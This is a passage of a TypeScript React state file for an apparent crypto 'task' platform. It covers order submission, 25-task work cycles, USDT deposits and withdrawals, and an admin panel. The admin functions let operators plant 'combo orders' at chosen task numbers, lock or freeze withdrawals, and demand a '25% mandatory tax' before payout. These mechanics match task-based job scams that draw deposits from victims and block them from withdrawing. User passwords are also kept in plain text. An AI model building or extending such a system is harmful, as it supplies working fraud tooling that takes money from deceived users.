              expectedIncome: Number((o.orderAmount + calculatedCommission).toFixed(4)),
              status: 'completed',
              completedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
            }
          : o
      )
    );

    const nextCompletedLifetime = (targetUser.completedTasksCount || 0) + 1;
    const nextCycleTasks = (targetUser.currentCycleTasks || 0) + 1;
    const isCycleNowFinished = nextCycleTasks >= 25;

    const today = new Date().toISOString().substring(0, 10);

    // Credit commission directly to user's balance and update cycle tracking
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === targetUser.id) {
          const isNewDay = u.lastActiveDate && u.lastActiveDate !== today;
          const currentTimes = isNewDay ? 0 : (u.todayOrdersCount ?? 0);
          const currentComm = isNewDay ? 0 : (u.todayCommission ?? 0);
          const yestComm = isNewDay ? (u.todayCommission ?? 0) : (u.yesterdayCommission ?? 0);

          return {
            ...u,
            balance: Number((u.balance + calculatedCommission).toFixed(4)),
            todayOrdersCount: currentTimes + 1, // Increment Today's Times by +1 on successful order submission
            todayCommission: Number((currentComm + calculatedCommission).toFixed(4)),
            yesterdayCommission: yestComm,
            lastActiveDate: today,
            completedTasksCount: nextCompletedLifetime,
            currentCycleTasks: nextCycleTasks,
            cycleApprovedByAdmin: !isCycleNowFinished, // Locks system when exactly 25 tasks hit
          };
        }
        return u;
      })
    );

    if (order.isComboOrder) {
      return {
        success: true,
        isCycleNowFinished,
        message: `Special Combo Order #${order.comboStepNumber || 14} completed! Earned massive +${calculatedCommission.toFixed(4)} USDT super commission! (Task ${nextCycleTasks}/25 completed)`,
      };
    }

    if (isCycleNowFinished) {
      return {
        success: true,
        isCycleNowFinished: true,
        message: `Task 25/25 completed! You have finished your 25-task work cycle! Withdrawal feature is now UNLOCKED. The task system is locked until approved by Admin.`,
      };
    }

    return {
      success: true,
      message: `Order submitted successfully! Earned +${order.commission.toFixed(4)} USDT commission! (Task ${nextCycleTasks}/25)`,
    };
  };

  // --------------------------------------------------------------------------
  // ADMIN PANEL METHODS & ROLE-BASED ACCESS CONTROL
  // --------------------------------------------------------------------------

  const switchAdmin = (adminId: string) => {
    setCurrentAdminId(adminId);
  };

  const resetUserTaskCycle = (userId: string, toCycle1 = false) => {
    if (!hasPermission('can_manage_users')) {
      return {
        success: false,
        message: 'Permission denied: Your role cannot manage user task cycles.',
      };
    }

    const targetUser = users.find((u) => u.id === userId);
    if (!targetUser) return { success: false, message: 'User not found.' };

    const nextCycleNum = toCycle1 ? 1 : (targetUser.cycleNumber || 1) + 1;
    // For fresh Cycle 1, planned combo is strictly Task #14 or #15
    const plannedCycle1Combo = Math.random() < 0.5 ? 14 : 15;

    setUsers((prev) =>
      prev.map((u) =>
        u.id === userId
          ? {
              ...u,
              todayOrdersCount: 0, // When Admin resets task cycle, reset Today's Times back to 0
              currentCycleTasks: 0, // Reset progress strictly to 0
              cycleNumber: nextCycleNum,
              cycleApprovedByAdmin: true,
              comboOrderStep: plannedCycle1Combo, // Strictly Task #14 or #15 planned
            }
          : u
      )
    );

    // If resetting to fresh Cycle 1, also clear any incomplete pending orders
    if (toCycle1) {
      setOrders((prev) => prev.filter((o) => !(o.userId === userId && o.status === 'incomplete')));
    }

    logAuditAction(
      'RESET_TASK_CYCLE',
      `Approved next 25 tasks & reset cycle for user ${targetUser.username} (UID: ${targetUser.uid}). Set to Cycle #${nextCycleNum} (0/25 tasks).`,
      targetUser.uid
    );

    return {
      success: true,
      message: `Work cycle reset! User ${targetUser.username} (UID: ${targetUser.uid}) set to Cycle #${nextCycleNum} with 0/25 progress.`,
    };
  };

  const resetUserToFreshCycle = (userId: string) => {
    return resetUserTaskCycle(userId, true);
  };

  const toggleUserVip = (userId: string) => {
    if (!hasPermission('can_manage_users')) {
      return { success: false, message: 'Permission denied: Cannot manage VIP status.' };
    }
    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    const nextVip = !target.isVipAccount;
    setUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, isVipAccount: nextVip } : u))
    );

    logAuditAction(
      'SET_VIP_STATUS',
      `${nextVip ? 'Enabled' : 'Disabled'} VIP Status (5 Combo Orders schedule) for UID: ${target.uid} (${target.username})`,
      target.uid
    );

    return {
      success: true,
      message: `User ${target.username} VIP status set to ${nextVip ? 'VIP (5 Combos)' : 'Normal'}.`,
    };
  };

  const toggleUserLock = (userId: string) => {
    if (!hasPermission('can_manage_users')) {
      return { success: false, message: 'Permission denied: Cannot lock/unlock accounts.' };
    }
    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    const nextLock = !target.isLockedAccount;
    setUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, isLockedAccount: nextLock } : u))
    );

    logAuditAction(
      'TOGGLE_ACCOUNT_LOCK',
      `${nextLock ? 'Locked' : 'Unlocked'} account withdrawal access for UID: ${target.uid} (${target.username})`,
      target.uid
    );

    return {
      success: true,
      message: `User ${target.username} withdrawal access ${nextLock ? 'LOCKED' : 'UNLOCKED'}.`,
    };
  };

  const setCustomUserCombos = (userId: string, combos: CustomComboRule[]) => {
    if (!hasPermission('can_manage_users')) {
      return { success: false, message: 'Permission denied: Cannot configure custom combos.' };
    }
    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    setUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, customCombos: combos } : u))
    );

    logAuditAction(
      'SET_CUSTOM_COMBOS',
      `Updated custom combo rules for UID: ${target.uid} (${target.username}): ${combos.length} triggers active`,
      target.uid
    );

    return {
      success: true,
      message: `Custom combo rules updated for ${target.username} (${combos.length} triggers).`,
    };
  };

  const clearUserTax = (userId: string) => {
    if (!hasPermission('can_manage_users') && !hasPermission('can_approve_withdrawals')) {
      return { success: false, message: 'Permission denied: Cannot clear user tax.' };
    }
    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    const taxAmount = Number((target.balance * 0.25).toFixed(2));
    setUsers((prev) =>
      prev.map((u) =>
        u.id === userId
          ? {
              ...u,
              taxPaid: true,
              taxAmountPaid: taxAmount,
            }
          : u
      )
    );

    logAuditAction(
      'CLEAR_USER_TAX',
      `Cleared/Approved 25% mandatory tax (${taxAmount} USDT) for UID: ${target.uid} (${target.username}). Withdrawal unlocked.`,
      target.uid
    );

    return {
      success: true,
      message: `Tax status cleared for ${target.username}. 25% tax requirement satisfied.`,
    };
  };

  const approveDeposit = (depositId: string) => {
    if (!hasPermission('can_approve_deposits')) {
      return { success: false, message: 'Permission denied: Your role cannot approve deposits.' };
    }

    const dep = deposits.find((d) => d.id === depositId);
    if (!dep) return { success: false, message: 'Deposit record not found.' };
    if (dep.status !== 'pending') return { success: false, message: 'Deposit has already been processed.' };

    // Update deposit status
    setDeposits((prev) =>
      prev.map((d) =>
        d.id === depositId
          ? {
              ...d,
              status: 'approved',
              reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
              reviewedBy: currentAdmin.username,
            }
          : d
      )
    );

    // Credit user balance and update VIP level if needed
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === dep.userId) {
          const newBal = Number((u.balance + dep.amount).toFixed(4));
          let vip = u.vipLevel;
          if (newBal >= 899) vip = Math.max(vip, 3);
          else if (newBal >= 499) vip = Math.max(vip, 2);
          else if (newBal >= 20) vip = Math.max(vip, 1);
          return {
            ...u,
            balance: newBal,
            vipLevel: vip,
          };
        }
        return u;
      })
    );

    logAuditAction(
      'APPROVE_DEPOSIT',
      `Approved deposit of ${dep.amount} USDT for user ${dep.username} (UID: ${dep.userUid}). TXID: ${dep.txid.substring(0, 16)}...`,
      dep.userUid
    );

    return { success: true, message: `Deposit of ${dep.amount} USDT approved and credited!` };
  };

  const rejectDeposit = (depositId: string, reason = 'Invalid or unverified transaction hash') => {
    if (!hasPermission('can_approve_deposits')) {
      return { success: false, message: 'Permission denied: Your role cannot reject deposits.' };
    }

    const dep = deposits.find((d) => d.id === depositId);
    if (!dep) return { success: false, message: 'Deposit record not found.' };
    if (dep.status !== 'pending') return { success: false, message: 'Deposit has already been processed.' };

    setDeposits((prev) =>
      prev.map((d) =>
        d.id === depositId
          ? {
              ...d,
              status: 'rejected',
              rejectionReason: reason,
              reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
              reviewedBy: currentAdmin.username,
            }
          : d
      )
    );

    logAuditAction(
      'REJECT_DEPOSIT',
      `Rejected deposit of ${dep.amount} USDT for ${dep.username} (UID: ${dep.userUid}). Reason: ${reason}`,
      dep.userUid
    );

    return { success: true, message: 'Deposit request rejected.' };
  };

  const approveWithdrawal = (withdrawalId: string) => {
    if (!hasPermission('can_approve_withdrawals')) {
      return { success: false, message: 'Permission denied: Your role cannot approve withdrawals.' };
    }

    const wd = withdrawals.find((w) => w.id === withdrawalId);
    if (!wd) return { success: false, message: 'Withdrawal record not found.' };
    if (wd.status !== 'pending') return { success: false, message: 'Withdrawal already processed.' };

    setWithdrawals((prev) =>
      prev.map((w) =>
        w.id === withdrawalId
          ? {
              ...w,
              status: 'completed',
              reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
              reviewedBy: currentAdmin.username,
            }
          : w
      )
    );

    logAuditAction(
      'APPROVE_WITHDRAWAL',
      `Accepted payout of ${wd.amount} USDT to TRC20 address ${wd.walletAddress.substring(0, 12)}... for UID: ${wd.userUid} (Status: Completed)`,
      wd.userUid
    );

    return { success: true, message: `Withdrawal of ${wd.amount} USDT approved! Status changed to Completed.` };
  };

  const rejectWithdrawal = (withdrawalId: string, reason = 'Address verification failed') => {
    if (!hasPermission('can_approve_withdrawals')) {
      return { success: false, message: 'Permission denied: Your role cannot reject withdrawals.' };
    }

    const wd = withdrawals.find((w) => w.id === withdrawalId);
    if (!wd) return { success: false, message: 'Withdrawal record not found.' };
    if (wd.status !== 'pending') return { success: false, message: 'Withdrawal already processed.' };

    // Refund funds back to user
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === wd.userId) {
          return {
            ...u,
            balance: Number((u.balance + wd.amount).toFixed(4)),
          };
        }
        return u;
      })
    );

    setWithdrawals((prev) =>
      prev.map((w) =>
        w.id === withdrawalId
          ? {
              ...w,
              status: 'rejected',
              rejectionReason: reason,
              reviewedAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
              reviewedBy: currentAdmin.username,
            }
          : w
      )
    );

    logAuditAction(
      'REJECT_WITHDRAWAL',
      `Rejected withdrawal of ${wd.amount} USDT for UID: ${wd.userUid} and refunded balance. Reason: ${reason}`,
      wd.userUid
    );

    return { success: true, message: 'Withdrawal rejected and funds refunded to user.' };
  };

  const adjustUserBalance = (
    userId: string,
    amount: number,
    type: 'credit' | 'debit',
    reason: string
  ) => {
    if (!hasPermission('can_credit_debit')) {
      return { success: false, message: 'Permission denied: Your role cannot modify user balances.' };
    }

    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    if (type === 'debit' && target.balance < amount) {
      return { success: false, message: 'User balance is insufficient for this debit.' };
    }

    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === userId) {
          const newBal =
            type === 'credit'
              ? Number((u.balance + amount).toFixed(4))
              : Number((u.balance - amount).toFixed(4));
          return { ...u, balance: newBal };
        }
        return u;
      })
    );

    logAuditAction(
      type === 'credit' ? 'CREDIT_BALANCE' : 'DEBIT_BALANCE',
      `${type.toUpperCase()}ED ${amount} USDT for UID: ${target.uid} (${target.username}). Reason: ${reason}`,
      target.uid
    );

    return {
      success: true,
      message: `Successfully ${type}ed ${amount} USDT for ${target.username}.`,
    };
  };

  const toggleUserStatus = (userId: string) => {
    if (!hasPermission('can_manage_users')) {
      return { success: false, message: 'Permission denied: Cannot freeze/unfreeze users.' };
    }

    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    const newStatus = target.status === 'active' ? 'frozen' : 'active';
    setUsers((prev) =>
      prev.map((u) => (u.id === userId ? { ...u, status: newStatus } : u))
    );

    logAuditAction(
      newStatus === 'frozen' ? 'FREEZE_USER' : 'UNFREEZE_USER',
      `${newStatus === 'frozen' ? 'Froze' : 'Unfroze'} account for UID: ${target.uid} (${target.username})`,
      target.uid
    );

    return {
      success: true,
      message: `User ${target.username} has been ${newStatus}.`,
    };
  };

  const resetUserPassword = (
    userId: string,
    type: 'login' | 'withdrawal',
    newPass: string
  ) => {
    if (!hasPermission('can_manage_users')) {
      return { success: false, message: 'Permission denied: Cannot reset passwords.' };
    }

    const target = users.find((u) => u.id === userId);
    if (!target) return { success: false, message: 'User not found.' };

    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === userId) {
          return type === 'login'
            ? { ...u, password: newPass }
            : { ...u, withdrawalPassword: newPass };
        }
        return u;
      })
    );

    logAuditAction(
      'RESET_PASSWORD',
      `Reset ${type} password for user UID: ${target.uid} (${target.username})`,
      target.uid
    );

    return { success: true, message: `${type} password reset successfully.` };
  };

  const generateInviteCode = (customCode?: string, maxUses?: number | null) => {
    if (!hasPermission('can_generate_invites')) {
      return { success: false, message: 'Permission denied: Cannot generate invite codes.' };
    }

    let code = (customCode || '').trim().toUpperCase();
    if (!code) {
      code = 'SYS' + Math.floor(1000 + Math.random() * 9000);
    }

    // Check duplicate
    if (inviteCodes.some((c) => c.code.toUpperCase() === code)) {
      return { success: false, message: 'This invitation code already exists.' };
    }

    const newCode: InviteCode = {
      id: 'inv_' + Date.now(),
      code,
      type: 'system',
      createdBy: currentAdmin.username,
      creatorRole: currentAdmin.role,
      usageCount: 0,
      maxUses: maxUses === undefined ? null : maxUses,
      status: 'active',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setInviteCodes((prev) => [newCode, ...prev]);

    logAuditAction(
      'CREATE_INVITE_CODE',
      `Generated system invitation code: ${code} (Limit: ${maxUses ?? 'Unlimited'})`
    );

    return { success: true, code, message: `System invite code "${code}" generated!` };
  };

  const generateBulkInviteCodes = (count: number, prefix = 'SYS') => {
    if (!hasPermission('can_generate_invites')) {
      return { success: false, message: 'Permission denied: Cannot generate invite codes.' };
    }

    const cleanCount = Math.min(Math.max(1, count), 50);
    const newItems: InviteCode[] = [];
    const now = new Date().toISOString().replace('T', ' ').substring(0, 19);

    for (let i = 0; i < cleanCount; i++) {
      const code = prefix.toUpperCase() + Math.floor(10000 + Math.random() * 90000);
      newItems.push({
        id: 'inv_' + Date.now() + '_' + i,
        code,
        type: 'system',
        createdBy: currentAdmin.username,
        creatorRole: currentAdmin.role,
        usageCount: 0,
        maxUses: null,
        status: 'active',
        createdAt: now,
      });
    }

    setInviteCodes((prev) => [...newItems, ...prev]);

    logAuditAction(
      'BULK_INVITE_CODES',
      `Generated ${cleanCount} bulk system invitation codes with prefix "${prefix}"`
    );

    return {
      success: true,
      count: cleanCount,
      message: `Successfully generated ${cleanCount} system invitation codes!`,
    };
  };

  const toggleInviteCodeStatus = (codeId: string) => {
    if (!hasPermission('can_generate_invites')) return;
    setInviteCodes((prev) =>
      prev.map((c) => {
        if (c.id === codeId) {
          const nextStatus = c.status === 'active' ? 'disabled' : 'active';
          logAuditAction('DISABLE_INVITE_CODE', `Toggled code ${c.code} status to ${nextStatus}`);
          return { ...c, status: nextStatus };
        }
        return c;
      })
    );
  };

  const createSubAdmin = (
    username: string,
    name: string,
    permissions: AdminPermission[]
  ) => {
    if (currentAdmin.role !== 'super_admin') {
      return { success: false, message: 'Only Super Admin can create sub-admins.' };
    }

    const clean = username.trim().toLowerCase();
    if (admins.some((a) => a.username.toLowerCase() === clean)) {
      return { success: false, message: 'This sub-admin username already exists.' };
    }

    const newSub: AdminUser = {
      id: 'admin_' + Date.now(),
      username: clean,
      name: name.trim() || 'Sub Admin',
      role: 'sub_admin',
      permissions,
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      status: 'active',
    };

    setAdmins((prev) => [...prev, newSub]);
    logAuditAction(
      'CREATE_SUBADMIN',
      `Created sub-admin "${clean}" with ${permissions.length} permissions`
    );

    return { success: true, message: `Sub-admin "${clean}" created successfully!` };
  };

  const updateSubAdminPermissions = (
    adminId: string,
    permissions: AdminPermission[]
  ) => {
    if (currentAdmin.role !== 'super_admin') {
      return { success: false, message: 'Only Super Admin can update roles.' };
    }

    setAdmins((prev) =>
      prev.map((a) => (a.id === adminId ? { ...a, permissions } : a))
    );

    const target = admins.find((a) => a.id === adminId);
    logAuditAction(
      'UPDATE_SUBADMIN',
      `Updated permissions for sub-admin ${target?.username} (${permissions.length} active)`
    );

    return { success: true, message: 'Permissions updated successfully.' };
  };

  const updateSystemConfig = (newConfig: Partial<SystemConfig>) => {
    if (!hasPermission('can_modify_wallet')) return;
    setSystemConfig((prev) => ({ ...prev, ...newConfig }));
    logAuditAction('UPDATE_SYSTEM_WALLET', 'Updated system TRC20 wallet configuration');
  };

  const resetAllData = () => {
    setUsers(INITIAL_USERS);
    setAdmins(INITIAL_ADMINS);
    setInviteCodes(INITIAL_INVITE_CODES);
    setDeposits(INITIAL_DEPOSITS);
    setWithdrawals(INITIAL_WITHDRAWALS);
    setOrders(INITIAL_ORDERS);
    setAuditLogs(INITIAL_AUDIT_LOGS);
    setSystemConfig(INITIAL_SYSTEM_CONFIG);
    setCurrentUserId('user_1');
    setCurrentAdminId('admin_super');
    localStorage.clear();
  };

  const addCompletedTasks = (count: number, userId?: string) => {
    const targetId = userId || currentUser?.id;
    if (!targetId) return;
    setUsers((prev) =>
      prev.map((u) => {
        if (u.id === targetId) {
          const nextCycleTasks = Math.min(25, (u.currentCycleTasks || 0) + count);
          const nextCompletedCount = Math.max(0, (u.completedTasksCount || 0) + count);
          return {
            ...u,
            completedTasksCount: nextCompletedCount,
            currentCycleTasks: nextCycleTasks,
            cycleApprovedByAdmin: nextCycleTasks >= 25 ? false : u.cycleApprovedByAdmin,
          };
        }
        return u;
      })
    );
  };

  return (
    <AppContext.Provider
      value={{
        currentUser,
        currentAdmin,
        activeView,
        setActiveView,
        deviceFrame,
        setDeviceFrame,
        language,
        setLanguage,
        t,
        users,
        admins,
        inviteCodes,
        deposits,
        withdrawals,
        orders,
        auditLogs,
        systemConfig,
        loginUser,
        registerUser,
        logoutUser,
        switchUser,
        updateUserAvatar,
        setWithdrawalPassword,
        bindWallet,
        submitDeposit,
        submitWithdrawal,
        addCompletedTasks,
        grabOrder,
        submitOrder,
        switchAdmin,
        hasPermission,
        resetUserTaskCycle,
        resetUserToFreshCycle,
        toggleUserVip,
        toggleUserLock,
        setCustomUserCombos,
        clearUserTax,
        approveDeposit,
        rejectDeposit,
        approveWithdrawal,
        rejectWithdrawal,
        adjustUserBalance,
        toggleUserStatus,
        resetUserPassword,
        generateInviteCode,
        generateBulkInviteCodes,
        toggleInviteCodeStatus,
        createSubAdmin,
        updateSubAdminPermissions,
        updateSystemConfig,
        resetAllData,
      }}
    >
      {children}
    </AppContext.Provider>
  );
};

export const useApp = () => {
  const context = useContext(AppContext);
  if (!context) {
    throw new Error('useApp must be used within an AppProvider');
  }
  return context;
};
